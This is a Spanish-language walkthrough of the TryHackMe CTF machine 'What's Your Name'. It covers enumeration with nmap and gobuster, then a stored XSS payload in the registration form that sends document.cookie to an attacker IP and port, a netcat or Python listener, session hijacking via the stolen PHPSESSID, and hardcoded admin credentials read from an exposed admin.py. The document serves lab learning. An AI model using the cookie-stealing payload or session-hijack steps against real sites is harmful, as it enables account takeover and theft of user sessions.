# 🕵️ Walkthrough: What's Your Name – TryHackMe

## 📌 Introducción

En este CTF trabajaremos con la máquina What's Your Name de TryHackMe.

El propósito es realizar una enumeración completa (red y servicios), identificar posibles vectores de explotación en la aplicación web y, si es posible, escalar privilegios para obtener la(s) bandera(s).

Quiero destacar que en este CTF he tenido que cambiar de IP de mi máquina victima debido a que tuve que realizar distintas conexiones para resolver el mismo.


## 🔎 Paso 1: Comprobando conectividad

Lo primero es verificar que la máquina víctima responde correctamente.
Realizamos un ping a la IP de destino 10.10.112.13:

ping -c 4 10.10.112.13


Resultado observado (captura):

<img width="570" height="219" alt="Ping" src="https://github.com/user-attachments/assets/470a8507-8569-4bd7-bac4-bc93834eef89" />

Salida transcrita:

PING 10.10.112.13 (10.10.112.13) 56(84) bytes of data.

64 bytes from 10.10.112.13: icmp_seq=1 ttl=63 time=47.7 ms

64 bytes from 10.10.112.13: icmp_seq=2 ttl=63 time=44.4 ms

64 bytes from 10.10.112.13: icmp_seq=3 ttl=63 time=43.4 ms

64 bytes from 10.10.112.13: icmp_seq=4 ttl=63 time=43.3 ms

--- 10.10.112.13 ping statistics ---

4 packets transmitted, 4 received, 0% packet loss, time 3005ms

rtt min/avg/max/mdev = 43.273/44.667/47.673/1.788 ms


### Observaciones

La máquina responde correctamente (0% de pérdida de paquetes).

Latencia estable (rtt promedio ≈ 44.7 ms).

Confirmado que la máquina está accesible: procedemos al escaneo de puertos y servicios.

## 🔧 Paso 2: Añadir el dominio al archivo /etc/hosts

Para que el nombre de host apunte a la IP de la máquina víctima (útil cuando la aplicación web usa un vhost), añadimos una entrada en /etc/hosts.

Entrada que añadiste (captura):

<img width="1147" height="186" alt="agrego sitio a hosts" src="https://github.com/user-attachments/assets/ed9c5916-c32c-43d3-9f97-ac2a5255f9b9" />

Línea agregada (como aparece en la captura):

10.10.112.13  worldwap.thm

Cómo hacerlo (comandos)

Abrir el archivo con un editor (ejemplo nano):

sudo nano /etc/hosts

o añadir la línea desde la terminal (evita duplicados; revisa antes el archivo):

revisar si ya existe

grep -n "10.10.112.13" /etc/hosts || true

añadir la entrada (usa >> para añadir al final)

echo "10.10.112.13 worldwap.thm" | sudo tee -a /etc/hosts


### ⚠️ Atención: revisa la ortografía del hostname (worldwap.thm en la captura). Si querías worldwap o worldwap distinto, corrígelo antes de guardar.

Verificar que funciona

Probar resolución y conectividad usando el nombre de host:

ping -c 4 worldwap.thm

Comprobar acceso web (si hay servicio HTTP):

en terminal

curl -I http://worldwap.thm

o abrir en el navegador:

http://worldwap.thm

### Observaciones

Añadir al /etc/hosts sólo afecta a tu máquina local (no cambia DNS global).

Útil cuando la aplicación web usa Virtual Hosts basados en el Host header.

Si más adelante cambias la IP de la máquina, recuerda actualizar o eliminar esa entrada.

## 🔎 Paso 3: Escaneo de puertos y servicios

Realizamos un escaneo con nmap para identificar puertos abiertos, detección de servicios y ejecución de scripts básicos:

nmap -sV -sC 10.10.112.13

Captura:

<img width="895" height="451" alt="nmap puertos abiertos" src="https://github.com/user-attachments/assets/6e1e7cac-a5b4-4379-a005-b3e61af42a7b" />

### Salida transcrita (resumen relevante):

Nmap scan report for worldwap.thm (10.10.112.13)

Host is up (0.045s latency).

Not shown: 997 closed tcp ports (reset)

PORT     STATE SERVICE VERSION

22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))

         | http-title: Welcome
         | Requested resource was /public/html/
         | http-cookie-flags:
         |   PHPSESSID: httponly flag not set

8081/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

         |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
         
Service detection performed.

### Observaciones

Puertos abiertos detectados: 22 (SSH), 80 (HTTP) y 8081 (HTTP).

Servidor web Apache en puertos 80 y 8081 (mismo software/version).

En el vhost 80 parece haber un recurso solicitado /public/html/.

PHP (PHPSESSID) está presente en el puerto 80 (posible aplicación PHP).

SSH está disponible (versión moderna OpenSSH 8.2p1) — apunta a posible acceso por credenciales/clave si encontramos usuarios o credenciales más adelante.

## 🔎 Paso 4: Probar el servicio HTTP (puerto 80)

Abrimos el sitio en el navegador usando el host que añadimos en /etc/hosts (worldwap.thm) y comprobamos la interfaz principal en http://worldwap.thm o en la ruta detectada /public/html/.

Captura (interfaz en el navegador):

<img width="1450" height="811" alt="probando puerto 80" src="https://github.com/user-attachments/assets/5fc63d6c-1da9-4dcb-a4f3-1662a4671b1e" />

### Observaciones visuales rápidas:

Sitio llamado WorldWAP con un encabezado y contenido estático (imagen y texto).

En la parte superior derecha aparece un enlace Register → indica que hay funcionalidad de registro/usuarios (posible vector: formularios, validaciones insuficientes, subida de ficheros, etc.).

La ruta /public/html/ fue mencionada por nmap como recurso solicitado — confirma que el contenido servido está en ese subdirectorio.

Presencia de sesión PHP (vimos PHPSESSID en el nmap) — sitio probablemente hecho en PHP.

## 🔎 Paso 5: Enumeración de directorios (gobuster)

Realizamos un dir brute-force con gobuster para encontrar rutas/archivos interesantes en el sitio http://worldwap.thm/.

Captura:

<img width="1137" height="404" alt="gobuster pagina" src="https://github.com/user-attachments/assets/182683ac-c439-4a99-a513-ae895d449df8" />

### Salida relevante (resumen transcrito)

/api/            (Status: 301) [Size: 310]  [--> http://worldwap.thm/api/]

/index.php       (Status: 302) [Size: 0]    [--> /public/html/]

/javascript/     (Status: 301) [Size: 317]  [--> http://worldwap.thm/javascript/]

/logs.txt        (Status: 200) [Size: 0]

/phpmyadmin      (Status: 301) [Size: 317]  [--> http://worldwap.thm/phpmyadmin/]

/public          (Status: 301) [Size: 313]  [--> http://worldwap.thm/public/]

### Observaciones

/api/ → Redirección (301). Indica que existe una API expuesta; investigar endpoints disponibles (podrían devolver JSON con información útil).

/index.php → Redirección (302) a /public/html/ — confirma que la app usa un front controller o reescrituras y que el contenido público está bajo /public.

/javascript/ → carpeta de scripts; revisar para encontrar archivos JS que contengan endpoints, claves, o lógica que ayude a explotar.

/logs.txt → Status 200 (archivo accesible). Muy interesante: si contiene información sensible (credenciales, rutas, errores), puede ser una vector de información (info leak).

/phpmyadmin → existe phpMyAdmin accesible (301). Esto puede ser un objetivo de explotación si está desprotegido o con versiones/configuraciones débiles.

/public → confirma la estructura /public (uploads, assets…). Buscar subdirectorios como /public/uploads, /public/html, /public/assets.

## 🔎 Paso 6: Enumeración del directorio /public/

Comprobamos el contenido del directorio público con gobuster para localizar carpetas y archivos estáticos:

gobuster dir -u 'http://worldwap.thm/public/' \
  -x php,html,css,js,txt,pdf,json \
  -w /home/quiquh4ck/Escritorio/wordlists/dirb/big.txt -b 403,500

Captura:

<img width="1153" height="415" alt="gobuster directorio public" src="https://github.com/user-attachments/assets/3ab7d777-06da-48d7-82f2-f81fc30685d5" />

### Salida relevante (resumen):

/css    (Status: 301) [--> http://worldwap.thm/public/css/]

/html   (Status: 301) [--> http://worldwap.thm/public/html/]

/images (Status: 301) [--> http://worldwap.thm/public/images/]

/js     (Status: 301) [--> http://worldwap.thm/public/js/]

### Observaciones

El directorio /public/ contiene las subcarpetas estáticas habituales: css, html, images, js.

Probablemente /public/html/ sea la parte visible que nmap ya indicó como recurso servido.

Estas carpetas pueden contener:

Archivos JavaScript con endpoints o lógica de la aplicación (útil para descubrir API/parameters).

Archivos HTML que muestran rutas, formularios y referencias a endpoints.

Directorios de imágenes (posible lugar para comprobar uploads).

Hojas de estilo que ocasionalmente incluyen comentarios con pistas.

## 🔎 Paso 7: Enumeración de /public/html/ (páginas públicas — login / register)

### Resultados relevantes (captura):

<img width="1136" height="419" alt="gobuster public html" src="https://github.com/user-attachments/assets/14cb6571-c559-4bee-830f-a57251d2e2c6" />

/index.php   (Status: 200) [Size: 1797]

/login.php   (Status: 200) [Size: 1785]

/logout.php  (Status: 200) [Size: 154]

/register.php(Status: 200) [Size: 2188]

### ✅ Observaciones

Existen las páginas públicas típicas de una aplicación con sistema de usuarios: index, login, logout y register.

Prioridad alta: register.php y login.php (formularios) — vectores directos para enumeración, fuzzing de parámetros y pruebas de inyección o fallos de validación.

logout.php indica manejo de sesiones (cookies/PHPSESSID) — importante para pruebas de autenticación y control de sesiones.

# 🔎 Paso 8: Enumeración del endpoint /api/ (rutas encontradas)

### Salida relevante (resumen transcrito)

<img width="1148" height="505" alt="gobuster directorio api" src="https://github.com/user-attachments/assets/2e30e469-8379-4016-afd8-bdeaa1942178" />

/add_post.php    (Status: 200) [Size: 34]

/config.php      (Status: 200) [Size: 0]

/index.php       (Status: 200) [Size: 34]

/login.php       (Status: 200) [Size: 34]

/logout.php      (Status: 200) [Size: 42]

/mod.php         (Status: 200) [Size: 25]

/posts.php       (Status: 200) [Size: 25]

/register.php    (Status: 200) [Size: 48]

/setup.php       (Status: 200) [Size: 16]

### 🔍 Observaciones inmediatas

Hay múltiples endpoints PHP orientados a la lógica de la aplicación (add_post.php, posts.php, mod.php, login.php, register.php) — esto sugiere una API REST/JSON o endpoints que aceptan POST/GET.

config.php responde con Status 200 pero Size: 0 — esto puede indicar:

El archivo existe pero devuelve vacío al solicitarlo vía HTTP (buena práctica), o

La app incluye config.php internamente pero no lo expone, o

Existe un punto de enumeración que permite leer su contenido con un vector (LFI) — ¡es una pista a investigar!

setup.php presente: muchas veces en CTFs setup.php puede permitir inicializar o resetear la DB — revisar su comportamiento.

add_post.php y posts.php indican funcionalidad de creación/listado de posts — posibles vectores para pruebas de inyección (SQLi), subida/almacenamiento de contenido (XSS), o abuse de la API.

## 🔎 Paso 9: Registro y Login — pruebas e resultados

Capturas:

Registro:

<img width="1446" height="702" alt="pagina de registro" src="https://github.com/user-attachments/assets/253d3044-6ec6-49ea-90ce-95175c8cd7f2" />


<img width="1385" height="603" alt="intento de logarme" src="https://github.com/user-attachments/assets/63ead6f1-7cc5-4092-85a1-fa8e28842019" />


Intento de login -> popup "User not verified.": ./intento_de_logarme.png

### ✅ Qué hice

Navegué a http://worldwap.thm/public/html/register.php y rellené el formulario de registro (ej.: username=test, password=xxxx, email=tester@test.thm, name=test).

Después intenté iniciar sesión en http://worldwap.thm/public/html/login.php con las mismas credenciales y obtuve un mensaje emergente: "User not verified."

### 📝 Observaciones iniciales

El flujo de registro incluye una etapa de verificación manual/por moderador (mensaje en la página: "Your details will be reviewed by the site moderator.").

<img width="1418" height="238" alt="visito pagina de registro con mensaje del moderador" src="https://github.com/user-attachments/assets/be99cdab-ad34-4a93-980c-884b201e1e7e" />

Registro vía formulario web crea el usuario, pero no permite login inmediato.

Esto sugiere que la tabla de usuarios tiene un campo verified / active que debe cambiar a true para permitir el acceso.

Dado que hay endpoints API (/api/register.php, /api/login.php) y phpMyAdmin detectado, hay varias vías para explorar: interactuar con la API, buscar vulnerabilidades en los endpoints,

o atacar la base de datos directamente (p.ej. phpMyAdmin, credenciales en config.php).

## 🔎 Paso 10: Probar la página de login (puerto 8081)

Abrimos la página de login en `http://worldwap.thm:8081/login.php` (puerto 8081) y probamos iniciar sesión con un usuario creado desde el formulario de registro.

**Capturas:**

<img width="1221" height="829" alt="intengo logarme en la pagina d elogin" src="https://github.com/user-attachments/assets/8f0c0782-a89f-49f4-a37c-c57d0e24a6b9" />

- Login en `:8081` mostrando error `Invalid username or password`.  

**Observaciones**

- La página responde en el puerto **8081** con un formulario de login visualmente distinto al de `:80`.
- Al intentar iniciar sesión con el usuario registrado anteriormente (`test`) aparece el mensaje de error: **"Invalid username or password."**
- En una prueba anterior con el login en `http://worldwap.thm/public/html/login.php` obtuvimos el popup **"User not verified."** → eso sugiere que hay dos comportamientos/hosts distintos:
  - `worldwap.thm` (puerto 80) aplica verificación/manual approval.
  - `worldwap.thm:8081` puede usar la misma base de datos pero tener reglas/flow distinto (o usar otro vhost `login.worldwap.thm` según la advertencia vista).

## 🔎 Observación: Cookie PHPSESSID sin HttpOnly

### Captura:

<img width="1446" height="541" alt="reviso cookies y el HttpOnly es False" src="https://github.com/user-attachments/assets/d61c07b1-5caa-48fb-82f7-8d7696e879c6" />

### ✅ Qué se ha observado

Al inspeccionar las cookies de http://worldwap.thm hemos comprobado que la cookie de sesión PHPSESSID tiene la propiedad HttpOnly = false (no está marcada como HttpOnly).

### ❗ Por qué importa (implicaciones)

Una cookie sin HttpOnly puede ser leída por JavaScript que se ejecute en el contexto del sitio.

Si existe XSS (Cross-Site Scripting) almacenado o reflejado en la aplicación, un atacante podría inyectar JavaScript que lea document.cookie y envíe la cookie de sesión a un servidor controlado por el atacante.

Con una cookie de sesión válida (PHPSESSID) robada, es posible secuestar la sesión del usuario objetivo (iniciar sesión como ese usuario sin conocer la contraseña). En un CTF esto suele usarse para acceder a cuentas moderadoras o áreas protegidas.

## 🔥 Paso 11: PoC XSS (persistente) — Registro con payload y robo de PHPSESSID

Contexto: En http://worldwap.thm/public/html/register.php inyectamos un payload en los campos del formulario (por ejemplo email o name) para probar XSS persistente. 

La cookie de sesión (PHPSESSID) no tiene HttpOnly, por lo que puede ser leída por JavaScript.

### 1) Payload inyectado (ejemplo) - Sacado del repositorio PayloadsAllTheThings

Se coloca este payload en email y name al registrarte:


<img width="1320" height="616" alt="introducir payload" src="https://github.com/user-attachments/assets/212936ec-3fcf-4c0a-9245-cc6efc547cd8" />


````<script>document.location='http://10.10.84.171:4444/XSS/grabber.php?c='+document.cookie</script>````


Explicación: cuando el navegador renderice ese campo donde el contenido se muestra sin escapado, 

ejecutará el script y redireccionará GET a tu servidor atacante añadiendo ?c=... con la cookie (o cualquier dato que quieras robar).

### ⚠️ Advertencia legal / ética

Estas pruebas son válidas únicamente en entornos controlados (CTF, laboratorio o sistemas con permiso explícito). 

No ejecutes payloads, scans o explotación contra sistemas que no te pertenecen o sin autorización.

### 2) Levantar receptor (listener)

# opción sencilla para ver peticiones HTTP entrantes

python3 -m http.server 4444
o
nc -lvnp 4444

<img width="1165" height="526" alt="respuesta del payload en el servidor python" src="https://github.com/user-attachments/assets/c9b96632-8c0a-46a4-a199-104e025786eb" />

### 3) Extraer valor de la cookie

De la petición recibida:

#### PHPSESSID=bapm4h70pmai9g51uocf4b95l

### 4) Reutilizar la cookie para obtener la sesión:

En el navegador (método visual)

Abre DevTools → Application → Cookies → selecciona el host (worldwap.thm o login.worldwap.thm según el caso).

Crea/edita la cookie PHPSESSID con el valor capturado.

Recarga la página; entrarás con la sesión asociada a esa cookie (en mi caso: Moderator).

<img width="1348" height="707" alt="login en la pagina como moderador primera flag" src="https://github.com/user-attachments/assets/c6e0f3be-028b-4f60-aaac-35c53b29f615" />

## 🔎 Paso 11: Resultados de gobuster en http://worldwap.thm:8081 (Markdown listo para README)

<img width="1141" height="507" alt="gobuster puerto 8081" src="https://github.com/user-attachments/assets/012fb229-f18e-4fbd-bbdd-7dd14ff06fde" />


### Salida relevante (resumen)

/admin.py               (Status: 200) [Size: 5537]

/assets/                (Status: 301) [--> http://worldwap.thm:8081/assets/]

/block.php              (Status: 200)

/change_password.php    (Status: 302) [--> login.php]

/chat.php               (Status: 302) [--> login.php]

/clear.php              (Status: 200)

/db.php                 (Status: 200)

/index.php              (Status: 200)

/javascript/            (Status: 301) [--> http://worldwap.thm:8081/javascript/]

/login.php              (Status: 200) [Size: 3108]

/logout.php             (Status: 302) [--> login.php]

/logs.txt               (Status: 200)

...

### ✅ Observaciones importantes

/admin.py (200, tamaño grande) — archivo Python accesible vía HTTP. Revisarlo es prioritario: puede contener código fuente (credenciales, lógica de autenticación, rutas ocultas, consultas SQL).

/db.php (200) — punto a inspeccionar: puede exponer información de la base de datos o permitir operaciones peligrosas si es mal diseñado.

/clear.php (200) — su nombre sugiere acción de limpieza/reset; puede permitir borrar logs o resetear datos; probar con cuidado.

/logs.txt (200) — archivo con potencial info leak (errores, credenciales, paths).

/change_password.php, /chat.php, /logout.php redirigen a login.php si no estás autenticado — indican funcionalidad existente que debemos inspeccionar tras obtener sesión.

/assets/ y /javascript/ contienen ficheros estáticos donde puede haber pistas (endpoints, URLs, comentarios).

El endpoint admin.py sugiere que la app incluye un componente Python — muy interesante para revisar inyección o exposición de código.

## Paso 12 🔎 Hallazgo: Credenciales hardcoded en `admin.py`

Al acceder a `http://worldwap.thm:8081/admin.py` se muestra parte del código fuente. En él aparecen credenciales hardcoded (ejemplo extraído):

<img width="1240" height="664" alt="entro a la pagina admin py" src="https://github.com/user-attachments/assets/a8d705a5-639e-4971-9930-f8be2c04f07e" />

Admin credentials (for demonstration purposes)

username = 'admin'

password = 'Un6u3$$4Bl3!!'

> **Advertencia:** estas credenciales están en texto plano dentro del código del servidor. No incluyas la contraseña real en repositorios públicos; en la documentación reemplázala por `REDACTED`.

# Paso 13 🏁 Resultado: Acceso Admin y Bandera obtenida

<img width="1406" height="501" alt="uso credenciales de la pag admin py" src="https://github.com/user-attachments/assets/7925ca1c-5461-4f89-a6b6-d29436953860" />


<img width="1442" height="805" alt="segunda flag en el panel de admin" src="https://github.com/user-attachments/assets/7a787642-d83d-4236-93d3-dbcc5253cad1" />


## ✅ Resumen

Gracias al flujo anterior (XSS → robo de cookie → reutilización de `PHPSESSID`) y a la lectura de `admin.py`, conseguí credenciales administrativas y pude iniciar sesión en `http://worldwap.thm:8081`. 

Con esa sesión obtuve acceso al panel **Admin** y encontré la segunda bandera.

> **Nota de seguridad / privacidad**: las credenciales y las flags han sido redactadas en las capturas para evitar divulgación pública.

---



